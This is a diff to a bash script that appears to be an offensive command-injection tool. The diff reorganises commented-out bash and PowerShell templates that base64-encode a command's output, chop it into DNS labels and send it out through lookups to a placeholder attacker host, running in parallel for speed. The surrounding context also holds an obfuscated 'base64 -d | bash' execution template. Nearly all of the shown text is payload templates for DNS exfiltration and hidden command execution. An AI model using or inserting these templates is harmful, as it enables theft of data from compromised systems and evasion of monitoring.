@@ -183,6 +183,16 @@ printf "Number of labels and label size: ${YELLOW}${nlabels}x${label_size}${NC}\
 
 ##########END OF ARGUMENT PROCESSING#############
 
+##########server-side processing definitions#######
+
+#looks like different script would be more appropriate for implementing
+#the server side data extraction similar with: https://github.com/0xC01DF00D/Collabfiltrator
+#the below command should work for bash with support for parallelism through xargs
+#bash_cmd="(${cmd})|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -P %THREADS% -n %NLABELS% bash -c 'IFS=.;echo %dns_trigger% \"\$*\".%STAGE_ID%%UNIQUE_DNS_HOST%' bash"
+
+#since powershell v7, we can add -Parallel and throttleLimit as parameters to foreach
+#powershell_cmd=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((${cmd}))).split("(.{1,%LABEL_SIZExNLABELS%})")|?{$_}|%{%dns_trigger% $("{0}{1}" -f $_.replace("(.{1,%LABEL_SIZE%})",'$1.'),"%UNIQUE_DNS_HOST%")}
+
 ##########bash definitions#######
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 [[ $oci -eq 1 ]] && {
@@ -198,14 +208,6 @@ assign bash user_cmd_template "\`(${cmd})|base64 -w0|{ read -r c;printf \${c:%IN
 
 assign bash user_cmd_out_len "\`(${cmd})|base64 -w0|wc -c\`"
 assign bash user_cmd_sep .
-
-
-##########bash definitions server-side#######
-
-#looks like different script would be more appropriate for implementing
-#the server side data extraction similar with: https://github.com/0xC01DF00D/Collabfiltrator
-#the below command should work for bash with support for parallelism through xargs
-#"(${cmd})|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -P %THREADS% -n %NLABELS% bash -c 'IFS=.;echo %dns_trigger% \"\$*\".%STAGE_ID%%UNIQUE_DNS_HOST%' bash"
 
 ###########powershell definitions########
 
